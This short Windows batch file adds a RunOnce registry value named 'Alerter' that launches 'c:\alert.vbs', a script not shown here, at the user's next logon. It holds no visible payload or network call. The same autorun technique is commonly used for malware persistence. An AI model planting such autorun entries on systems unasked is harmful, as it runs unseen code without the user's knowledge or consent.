@echo off

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce /t Reg_SZ /v Alerter /d "c:\alert.vbs"
